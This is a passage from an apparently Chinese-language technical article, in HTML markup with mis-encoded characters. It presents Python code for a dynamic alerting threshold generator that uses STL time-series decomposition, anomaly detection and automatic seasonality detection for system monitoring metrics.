    1. ç»´æŠ¤æ»‘åŠ¨çª—å£å†å²æ•°æ®
    2. STLæ—¶é—´åºåˆ—åˆ†è§£
    3. åŠ¨æ€é˜ˆå€¼è®¡ç®—
    4. å¼‚å¸¸æ£€æµ‹ä¸ç½®ä¿¡åº¦è¯„ä¼°
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 window_size=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤© Ã— 24å°æ—¶</span>
                 seasonal_period=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å­£èŠ‚å‘¨æœŸ</span>
                 sigma_multiplier=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3ÏƒåŸåˆ™</span>
                 min_samples=<span class="hljs-number">48</span></span>):      <span class="hljs-comment"># æœ€å°‘éœ€è¦2å¤©æ•°æ®</span>
        <span class="hljs-string">"""
        å‚æ•°è¯´æ˜ï¼š
        - window_size: æ»‘åŠ¨çª—å£å¤§å°ï¼ˆå°æ—¶æ•°ï¼‰
        - seasonal_period: å­£èŠ‚å‘¨æœŸï¼ˆå°æ—¶æ•°ï¼‰
        - sigma_multiplier: æ ‡å‡†å·®å€æ•°
        - min_samples: å¼€å§‹è®¡ç®—é˜ˆå€¼çš„æœ€å°æ ·æœ¬æ•°
        """</span>
        self.window_size = window_size
        self.seasonal_period = seasonal_period
        self.sigma_multiplier = sigma_multiplier
        self.min_samples = min_samples
        
        <span class="hljs-comment"># ä½¿ç”¨dequeå®ç°é«˜æ•ˆçš„æ»‘åŠ¨çª—å£</span>
        self.history = deque(maxlen=window_size)
        
        <span class="hljs-comment"># ç¼“å­˜ä¸Šä¸€æ¬¡çš„åˆ†è§£ç»“æœï¼Œç”¨äºå¼‚å¸¸æ£€æµ‹</span>
        self.last_decomposition = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span>
        self.stats = {
            <span class="hljs-string">'total_points'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'alerts_triggered'</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">'false_positive_rate'</span>: <span class="hljs-number">0.0</span>
        }
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_and_get_thresholds</span>(<span class="hljs-params">self, new_data_point, timestamp</span>):
        <span class="hljs-string">"""
        æ›´æ–°æ•°æ®å¹¶è¿”å›å½“å‰åŠ¨æ€é˜ˆå€¼
        
        Args:
            new_data_point: æ–°çš„ç›‘æ§æŒ‡æ ‡å€¼
            timestamp: æ—¶é—´æˆ³ï¼ˆdatetimeå¯¹è±¡ï¼‰
        
        Returns:
            dict: åŒ…å«é˜ˆå€¼ã€å‘Šè­¦çŠ¶æ€ã€ç½®ä¿¡åº¦ç­‰ä¿¡æ¯
        """</span>
        <span class="hljs-comment"># 1. æ•°æ®éªŒè¯ä¸é¢„å¤„ç†</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_data(new_data_point):
            <span class="hljs-keyword">return</span> self._get_default_response(new_data_point)
        
        <span class="hljs-comment"># 2. æ›´æ–°å†å²æ•°æ®</span>
        self.history.append({
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'value'</span>: new_data_point
        })
        self.stats[<span class="hljs-string">'total_points'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 3. æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ•°æ®è¿›è¡Œåˆ†æ</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &lt; self.min_samples:
            <span class="hljs-keyword">return</span> self._get_bootstrap_response(new_data_point)
        
        <span class="hljs-comment"># 4. æ‰§è¡Œæ—¶é—´åºåˆ—åˆ†è§£</span>
        <span class="hljs-keyword">try</span>:
            decomposition = self._perform_stl_decomposition()
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            self.logger.error(<span class="hljs-string">f"STLåˆ†è§£å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            <span class="hljs-keyword">return</span> self._get_fallback_response(new_data_point)
        
        <span class="hljs-comment"># 5. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        thresholds = self._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># 6. å¼‚å¸¸æ£€æµ‹</span>
        is_alert, alert_type = self._detect_anomaly(
            new_data_point, 
            thresholds, 
            decomposition
        )
        
        <span class="hljs-comment"># 7. è®¡ç®—ç½®ä¿¡åº¦</span>
        confidence = self._calculate_confidence(decomposition)
        
        <span class="hljs-comment"># 8. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
        <span class="hljs-keyword">if</span> is_alert:
            self.stats[<span class="hljs-string">'alerts_triggered'</span>] += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 9. æ„å»ºè¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'timestamp'</span>: timestamp,
            <span class="hljs-string">'current_value'</span>: new_data_point,
            <span class="hljs-string">'expected_value'</span>: thresholds[<span class="hljs-string">'expected'</span>],
            <span class="hljs-string">'upper_bound'</span>: thresholds[<span class="hljs-string">'upper'</span>],
            <span class="hljs-string">'lower_bound'</span>: thresholds[<span class="hljs-string">'lower'</span>],
            <span class="hljs-string">'is_alert'</span>: is_alert,
            <span class="hljs-string">'alert_type'</span>: alert_type,
            <span class="hljs-string">'confidence'</span>: confidence,
            <span class="hljs-string">'deviation_percentage'</span>: self._calculate_deviation_percentage(
                new_data_point, thresholds[<span class="hljs-string">'expected'</span>]
            ),
            <span class="hljs-string">'trend'</span>: decomposition[<span class="hljs-string">'trend_direction'</span>],
            <span class="hljs-string">'seasonality_factor'</span>: decomposition[<span class="hljs-string">'seasonal_factor'</span>]
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_perform_stl_decomposition</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡ŒSTLæ—¶é—´åºåˆ—åˆ†è§£"""</span>
        <span class="hljs-comment"># æå–æ—¶é—´åºåˆ—å€¼</span>
        values = np.array([point[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> point <span class="hljs-keyword">in</span> self.history])
        
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼å’Œå¼‚å¸¸å€¼</span>
        values = self._preprocess_series(values)
        
        <span class="hljs-comment"># STLåˆ†è§£</span>
        stl = STL(
            values, 
            seasonal=self.seasonal_period,
            trend=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># è‡ªåŠ¨é€‰æ‹©è¶‹åŠ¿çª—å£</span>
            robust=<span class="hljs-literal">True</span>  <span class="hljs-comment"># ä½¿ç”¨é²æ£’æ€§æ‹Ÿåˆï¼Œå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</span>
        )
        result = stl.fit()
        
        <span class="hljs-comment"># æå–å„ç»„æˆéƒ¨åˆ†</span>
        trend = result.trend
        seasonal = result.seasonal
        residual = result.resid
        
        <span class="hljs-comment"># è®¡ç®—æ®‹å·®ç»Ÿè®¡é‡</span>
        residual_std = np.std(residual)
        residual_mean = np.mean(residual)
        
        <span class="hljs-comment"># åˆ¤æ–­è¶‹åŠ¿æ–¹å‘</span>
        trend_direction = self._analyze_trend(trend)
        
        <span class="hljs-comment"># è®¡ç®—å­£èŠ‚æ€§å› å­ï¼ˆå½“å‰æ—¶åˆ»çš„å­£èŠ‚æ€§å¼ºåº¦ï¼‰</span>
        seasonal_factor = seasonal[-<span class="hljs-number">1</span>] / np.mean(np.<span class="hljs-built_in">abs</span>(seasonal))
        
        decomposition = {
            <span class="hljs-string">'trend'</span>: trend,
            <span class="hljs-string">'seasonal'</span>: seasonal,
            <span class="hljs-string">'residual'</span>: residual,
            <span class="hljs-string">'residual_std'</span>: residual_std,
            <span class="hljs-string">'residual_mean'</span>: residual_mean,
            <span class="hljs-string">'trend_direction'</span>: trend_direction,
            <span class="hljs-string">'seasonal_factor'</span>: seasonal_factor,
            <span class="hljs-string">'current_trend'</span>: trend[-<span class="hljs-number">1</span>],
            <span class="hljs-string">'current_seasonal'</span>: seasonal[-<span class="hljs-number">1</span>]
        }
        
        self.last_decomposition = decomposition
        <span class="hljs-keyword">return</span> decomposition
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""è®¡ç®—åŠ¨æ€é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æœŸå€¼ = è¶‹åŠ¿ + å­£èŠ‚æ€§</span>
        expected_value = (
            decomposition[<span class="hljs-string">'current_trend'</span>] + 
            decomposition[<span class="hljs-string">'current_seasonal'</span>]
        )
        
        <span class="hljs-comment"># åŠ¨æ€æ³¢åŠ¨èŒƒå›´ = sigma_multiplier Ã— æ®‹å·®æ ‡å‡†å·®</span>
        dynamic_range = (
            self.sigma_multiplier * 
            decomposition[<span class="hljs-string">'residual_std'</span>]
        )
        
        <span class="hljs-comment"># è€ƒè™‘è¶‹åŠ¿æ–¹å‘çš„è‡ªé€‚åº”è°ƒæ•´</span>
        <span class="hljs-keyword">if</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'increasing'</span>:
            <span class="hljs-comment"># ä¸Šå‡è¶‹åŠ¿ï¼šæ”¾å®½ä¸Šç•Œï¼Œæ”¶ç´§ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">1.2</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">0.8</span>
        <span class="hljs-keyword">elif</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'decreasing'</span>:
            <span class="hljs-comment"># ä¸‹é™è¶‹åŠ¿ï¼šæ”¶ç´§ä¸Šç•Œï¼Œæ”¾å®½ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">0.8</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">1.2</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># å¹³ç¨³è¶‹åŠ¿ï¼šå¯¹ç§°é˜ˆå€¼</span>
            upper_bound = expected_value + dynamic_range
            lower_bound = expected_value - dynamic_range
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'expected'</span>: expected_value,
            <span class="hljs-string">'upper'</span>: upper_bound,
            <span class="hljs-string">'lower'</span>: lower_bound,
            <span class="hljs-string">'dynamic_range'</span>: dynamic_range
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_anomaly</span>(<span class="hljs-params">self, current_value, thresholds, decomposition</span>):
        <span class="hljs-string">"""
        å¤šç»´åº¦å¼‚å¸¸æ£€æµ‹
        
        æ£€æµ‹ç»´åº¦ï¼š
        1. é˜ˆå€¼çªç ´æ£€æµ‹
        2. è¿ç»­åç¦»æ£€æµ‹
        3. çªå˜æ£€æµ‹
        """</span>
        is_alert = <span class="hljs-literal">False</span>
        alert_type = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»´åº¦1ï¼šåŸºç¡€é˜ˆå€¼æ£€æµ‹</span>
        <span class="hljs-keyword">if</span> current_value &gt; thresholds[<span class="hljs-string">'upper'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'upper_breach'</span>
        <span class="hljs-keyword">elif</span> current_value &lt; thresholds[<span class="hljs-string">'lower'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'lower_breach'</span>
        
        <span class="hljs-comment"># ç»´åº¦2ï¼šè¿ç»­åç¦»æ£€æµ‹ï¼ˆæœ€è¿‘3ä¸ªç‚¹éƒ½åç¦»ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">3</span>:
            recent_values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">3</span>:]]
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(v &gt; thresholds[<span class="hljs-string">'expected'</span>] * <span class="hljs-number">1.1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> recent_values):
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sustained_high'</span>
        
        <span class="hljs-comment"># ç»´åº¦3ï¼šçªå˜æ£€æµ‹ï¼ˆç›¸å¯¹äºå‰ä¸€ä¸ªç‚¹å˜åŒ–è¶…è¿‡50%ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">2</span>:
            prev_value = <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">2</span>][<span class="hljs-string">'value'</span>]
            change_rate = <span class="hljs-built_in">abs</span>(current_value - prev_value) / prev_value
            <span class="hljs-keyword">if</span> change_rate &gt; <span class="hljs-number">0.5</span>:
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sudden_change'</span>
        
        <span class="hljs-keyword">return</span> is_alert, alert_type
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_confidence</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""
        è®¡ç®—ç½®ä¿¡åº¦
        
        ç½®ä¿¡åº¦è¶Šé«˜ï¼Œè¯´æ˜ï¼š
        1. å†å²æ•°æ®è¶Šå……è¶³
        2. æ¨¡å¼è¶Šç¨³å®šï¼ˆæ®‹å·®è¶Šå°ï¼‰
        3. å­£èŠ‚æ€§è¶Šæ˜æ˜¾
        """</span>
        <span class="hljs-comment"># å› å­1ï¼šæ•°æ®å……è¶³åº¦ï¼ˆ0-1ï¼‰</span>
        data_sufficiency = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(self.history) / self.window_size, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-comment"># å› å­2ï¼šæ¨¡å¼ç¨³å®šæ€§ï¼ˆ0-1ï¼‰</span>
        <span class="hljs-comment"># æ®‹å·®æ ‡å‡†å·®è¶Šå°ï¼Œç¨³å®šæ€§è¶Šé«˜</span>
        residual_cv = (
            decomposition[<span class="hljs-string">'residual_std'</span>] / 
            (<span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'current_trend'</span>]) + <span class="hljs-number">1e-6</span>)
        )
        pattern_stability = <span class="hljs-number">1.0</span> / (<span class="hljs-number">1.0</span> + residual_cv)
        
        <span class="hljs-comment"># å› å­3ï¼šå­£èŠ‚æ€§å¼ºåº¦ï¼ˆ0-1ï¼‰</span>
        seasonal_strength = <span class="hljs-built_in">min</span>(
            <span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'seasonal_factor'</span>]), 
            <span class="hljs-number">1.0</span>
        )
        
        <span class="hljs-comment"># ç»¼åˆç½®ä¿¡åº¦ï¼ˆåŠ æƒå¹³å‡ï¼‰</span>
        confidence = (
            <span class="hljs-number">0.4</span> * data_sufficiency +
            <span class="hljs-number">0.4</span> * pattern_stability +
            <span class="hljs-number">0.2</span> * seasonal_strength
        )
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(confidence, <span class="hljs-number">3</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_trend</span>(<span class="hljs-params">self, trend</span>):
        <span class="hljs-string">"""åˆ†æè¶‹åŠ¿æ–¹å‘"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(trend) &lt; <span class="hljs-number">24</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒæœ€è¿‘24å°æ—¶çš„è¶‹åŠ¿</span>
        recent_trend = trend[-<span class="hljs-number">24</span>:]
        slope = np.polyfit(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(recent_trend)), recent_trend, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
        
        <span class="hljs-comment"># ç›¸å¯¹å˜åŒ–ç‡</span>
        relative_slope = slope / (np.mean(recent_trend) + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-keyword">if</span> relative_slope &gt; <span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'increasing'</span>
        <span class="hljs-keyword">elif</span> relative_slope &lt; -<span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'decreasing'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_deviation_percentage</span>(<span class="hljs-params">self, current, expected</span>):
        <span class="hljs-string">"""è®¡ç®—åç¦»ç™¾åˆ†æ¯”"""</span>
        <span class="hljs-keyword">if</span> expected == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(((current - expected) / expected) * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""é¢„å¤„ç†æ—¶é—´åºåˆ—"""</span>
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼ï¼ˆçº¿æ€§æ’å€¼ï¼‰</span>
        values = pd.Series(values).interpolate(method=<span class="hljs-string">'linear'</span>).values
        
        <span class="hljs-comment"># å¤„ç†å¼‚å¸¸å€¼ï¼ˆä½¿ç”¨ä¸­ä½æ•°ç»å¯¹åå·®MADæ–¹æ³•ï¼‰</span>
        median = np.median(values)
        mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
        threshold = <span class="hljs-number">3</span> * mad
        
        <span class="hljs-comment"># å°†å¼‚å¸¸å€¼æ›¿æ¢ä¸ºä¸­ä½æ•°</span>
        values = np.where(
            np.<span class="hljs-built_in">abs</span>(values - median) &gt; threshold,
            median,
            values
        )
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_validate_data</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®éªŒè¯"""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> np.isnan(value) <span class="hljs-keyword">or</span> np.isinf(value):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_default_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ— æ•ˆæ•°æ®çš„é»˜è®¤å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'invalid_data'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_bootstrap_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®ä¸è¶³æ—¶çš„å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'bootstrapping'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>,
            <span class="hljs-string">'message'</span>: <span class="hljs-string">f'éœ€è¦è‡³å°‘<span class="hljs-subst">{self.min_samples}</span>ä¸ªæ•°æ®ç‚¹'</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_fallback_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""åˆ†è§£å¤±è´¥æ—¶çš„é™çº§å“åº”"""</span>
        <span class="hljs-comment"># ä½¿ç”¨ç®€å•çš„ç§»åŠ¨å¹³å‡ä½œä¸ºé™çº§æ–¹æ¡ˆ</span>
        values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.history]
        mean = np.mean(values)
        std = np.std(values)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'upper_bound'</span>: mean + <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'lower_bound'</span>: mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'is_alert'</span>: value &gt; mean + <span class="hljs-number">3</span> * std <span class="hljs-keyword">or</span> value &lt; mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'fallback_mode'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.5</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_statistics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è·å–ç»Ÿè®¡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">'total_points'</span>] &gt; <span class="hljs-number">0</span>:
            alert_rate = (
                self.stats[<span class="hljs-string">'alerts_triggered'</span>] / 
                self.stats[<span class="hljs-string">'total_points'</span>]
            )
        <span class="hljs-keyword">else</span>:
            alert_rate = <span class="hljs-number">0.0</span>
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'total_points'</span>: self.stats[<span class="hljs-string">'total_points'</span>],
            <span class="hljs-string">'alerts_triggered'</span>: self.stats[<span class="hljs-string">'alerts_triggered'</span>],
            <span class="hljs-string">'alert_rate'</span>: <span class="hljs-built_in">round</span>(alert_rate * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
        }
</code></pre>
<p>3.2.2 å®é™…ä½¿ç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆå§‹åŒ–åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</span>
<span class="hljs-attr">threshold_gen</span> = DynamicThresholdGenerator(
    <span class="hljs-attr">window_size</span>=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">seasonal_period</span>=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å‘¨æœŸ</span>
    <span class="hljs-attr">sigma_multiplier</span>=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3Ïƒ</span>
    <span class="hljs-attr">min_samples</span>=<span class="hljs-number">48</span>        <span class="hljs-comment"># è‡³å°‘2å¤©æ•°æ®</span>
)

<span class="hljs-comment"># æ¨¡æ‹Ÿå®æ—¶æ•°æ®æµ</span>
import random
from datetime import datetime, timedelta

<span class="hljs-attr">base_time</span> = datetime.now() - timedelta(days=<span class="hljs-number">7</span>)

for hour in range(168):  <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">timestamp</span> = base_time + timedelta(hours=hour)
    
    <span class="hljs-comment"># æ¨¡æ‹ŸçœŸå®ä¸šåŠ¡æ•°æ®ï¼š</span>
    <span class="hljs-comment"># åŸºç¡€è´Ÿè½½ + æ—¥å‘¨æœŸ + å‘¨å‘¨æœŸ + éšæœºå™ªå£°</span>
    <span class="hljs-attr">base_load</span> = <span class="hljs-number">50</span>
    <span class="hljs-attr">daily_pattern</span> = <span class="hljs-number">20</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">24</span>)
    <span class="hljs-attr">weekly_pattern</span> = <span class="hljs-number">10</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">168</span>)
    <span class="hljs-attr">noise</span> = random.gauss(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)
    
    <span class="hljs-attr">cpu_usage</span> = base_load + daily_pattern + weekly_pattern + noise
    
    <span class="hljs-comment"># æ›´æ–°é˜ˆå€¼å¹¶è·å–ç»“æœ</span>
    <span class="hljs-attr">result</span> = threshold_gen.update_and_get_thresholds(cpu_usage, timestamp)
    
    <span class="hljs-comment"># å¦‚æœè§¦å‘å‘Šè­¦ï¼Œæ‰“å°è¯¦ç»†ä¿¡æ¯</span>
    if result<span class="hljs-section">['is_alert']</span>:
        print(f"""
        âš ï¸  å‘Šè­¦è§¦å‘ï¼
        æ—¶é—´: {result<span class="hljs-section">['timestamp']</span>}
        å½“å‰å€¼: {result<span class="hljs-section">['current_value']</span>:.2f}%
        é¢„æœŸå€¼: {result<span class="hljs-section">['expected_value']</span>:.2f}%
        ä¸Šç•Œ: {result<span class="hljs-section">['upper_bound']</span>:.2f}%
        ä¸‹ç•Œ: {result<span class="hljs-section">['lower_bound']</span>:.2f}%
        åç¦»åº¦: {result<span class="hljs-section">['deviation_percentage']</span>}%
        å‘Šè­¦ç±»å‹: {result<span class="hljs-section">['alert_type']</span>}
        ç½®ä¿¡åº¦: {result<span class="hljs-section">['confidence']</span>}
        è¶‹åŠ¿: {result<span class="hljs-section">['trend']</span>}
        """)

<span class="hljs-comment"># æ‰“å°ç»Ÿè®¡ä¿¡æ¯</span>
<span class="hljs-attr">stats</span> = threshold_gen.get_statistics()
print(f"\nç»Ÿè®¡ä¿¡æ¯ï¼š")
print(f"æ€»æ•°æ®ç‚¹: {stats<span class="hljs-section">['total_points']</span>}")
print(f"å‘Šè­¦æ¬¡æ•°: {stats<span class="hljs-section">['alerts_triggered']</span>}")
print(f"å‘Šè­¦ç‡: {stats<span class="hljs-section">['alert_rate']</span>}%")
</code></pre>
<h3 data-id="heading-11">3.3 å…³é”®æŠ€æœ¯ç»†èŠ‚è§£æ</h3>
<h3 data-id="heading-12">3.3.1 æ»‘åŠ¨çª—å£çš„é€‰æ‹©</h3>
<p>çª—å£å¤§å°çš„æƒè¡¡ï¼š</p>
<ul>
<li>å¤ªå°ï¼ˆå¦‚24å°æ—¶ï¼‰ï¼šæ— æ³•æ•æ‰å‘¨å‘¨æœŸï¼Œå¯¹çªå‘äº‹ä»¶æ•æ„Ÿåº¦è¿‡é«˜</li>
<li>å¤ªå¤§ï¼ˆå¦‚30å¤©ï¼‰ï¼šå“åº”é€Ÿåº¦æ…¢ï¼Œæ— æ³•å¿«é€Ÿé€‚åº”ä¸šåŠ¡å˜åŒ–</li>
<li>æ¨èï¼š7å¤©ï¼ˆ168å°æ—¶ï¼‰æ˜¯ä¸€ä¸ªå¹³è¡¡ç‚¹</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># ä¸åŒä¸šåŠ¡åœºæ™¯çš„çª—å£é…ç½®</span>
<span class="hljs-string">WINDOW_CONFIGS</span> <span class="hljs-string">=</span> {
    <span class="hljs-attr">'high_frequency_trading':</span> <span class="hljs-number">24</span>,      <span class="hljs-comment"># é«˜é¢‘äº¤æ˜“ï¼š1å¤©</span>
    <span class="hljs-attr">'web_service':</span> <span class="hljs-number">168</span>,                <span class="hljs-comment"># WebæœåŠ¡ï¼š7å¤©</span>
    <span class="hljs-attr">'batch_processing':</span> <span class="hljs-number">720</span>,           <span class="hljs-comment"># æ‰¹å¤„ç†ï¼š30å¤©</span>
    <span class="hljs-attr">'iot_sensor':</span> <span class="hljs-number">8760</span>                 <span class="hljs-comment"># IoTä¼ æ„Ÿå™¨ï¼š1å¹´</span>
}
</code></pre>
<h3 data-id="heading-13">3.3.2 å­£èŠ‚å‘¨æœŸçš„è¯†åˆ«</h3>
<p>è‡ªåŠ¨å‘¨æœŸæ£€æµ‹ï¼ˆä½¿ç”¨è‡ªç›¸å…³å‡½æ•°ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.stattools <span class="hljs-keyword">import</span> acf

<span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_detect_seasonality</span>(<span class="hljs-params">values, max_lag=<span class="hljs-number">168</span></span>):
    <span class="hljs-string">"""è‡ªåŠ¨æ£€æµ‹å­£èŠ‚å‘¨æœŸ"""</span>
    <span class="hljs-comment"># è®¡ç®—è‡ªç›¸å…³ç³»æ•°</span>
    acf_values = acf(values, nlags=max_lag)
    
    <span class="hljs-comment"># å¯»æ‰¾ç¬¬ä¸€ä¸ªæ˜¾è‘—çš„å³°å€¼ï¼ˆæ’é™¤lag=0ï¼‰</span>
    peaks = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(acf_values) - <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> (acf_values[i] &gt; acf_values[i-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> 
            acf_values[i] &gt; acf_values[i+<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span>
            acf_values[i] &gt; <span class="hljs-number">0.3</span>):  <span class="hljs-comment"># æ˜¾è‘—æ€§é˜ˆå€¼</span>
            peaks.append((i, acf_values[i]))
    
    <span class="hljs-keyword">if</span> peaks:
        <span class="hljs-comment"># è¿”å›æœ€æ˜¾è‘—çš„å‘¨æœŸ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(peaks, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>]
